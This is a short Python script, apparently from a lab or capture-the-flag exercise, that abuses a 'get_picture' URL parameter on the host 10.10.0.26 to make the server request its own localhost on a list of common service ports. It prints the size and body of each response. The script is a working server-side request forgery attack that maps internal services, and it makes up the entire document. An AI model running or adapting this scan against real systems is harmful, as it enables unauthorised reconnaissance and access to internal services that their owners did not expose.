import requests

portas = {21,22,23,25,139,445,443,80,8080,8000,3306,5432,8888,8443,3389}
for port in portas:
        print("Testando porta ["+str(port)+"]:")
        r=requests.get("http://10.10.0.26/?get_picture=http://localhost:"+str(port))
        print(len(r.text))
        print(r.text)
